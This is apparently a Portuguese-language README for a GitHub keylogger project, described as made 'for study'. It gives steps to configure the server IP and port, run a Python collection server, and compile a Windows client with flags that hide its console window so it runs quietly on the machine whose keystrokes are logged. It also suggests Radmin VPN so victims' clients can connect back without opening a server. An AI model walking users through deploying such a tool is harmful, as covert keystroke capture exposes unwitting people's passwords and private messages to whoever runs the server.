# Keylogger

Este Keylogger foi feito para fins de estudo. Para ser um keylogger realmente eficiente, devem ser feitos vários ajustes. Porém, ele funciona na sua localhost. Você pode usar o Radmin VPN para que o cliente se conecte a você, assim você não precisa abrir um servidor.

### Mudar o ip e a porta do servidor em *main.cpp*
  ` #define SERVER_IP ""          // IP do servidor `   
  `#define SERVER_PORT 8080      // porta do servidor `

### Executar o servidor em um sistema Linux (recomendado)
  ```bash
  git clone https://github.com/VictorJMM/Keylogger.git
  cd Keylogger
  cd servidor
  python servidor.py
  ```
### Executar o servidor em um sistema Windows
-  baixar o [python](https://www.python.org/downloads/windows/)
-  baixar o [git](https://git-scm.com/downloads/win)
  ```bash
  git clone https://github.com/VictorJMM/Keylogger.git
  cd Keylogger
  cd servidor
  python servidor.py
  ```
### baixar o compilador e Compilar o cliente
- baixar o [gcc](https://gcc.gnu.org/) (Windows)
- baixar o gcc(Linux ubuntu)
  ```bash
  sudo apt update
  sudo apt install build-essential
  gcc --version
  ```
- baixar o gcc(Linux Arch Linux)
  ```bash
  sudo pacman -S base-devel
  gcc --version
  ```
- compilar o main.cpp
  ```bash
  cd Keylogger
  g++ main.cpp -o main.exe -mwindows -static -lws2_32
  ```
  O main.exe deve ser executado no dispositivo que será registrado as teclas.
   
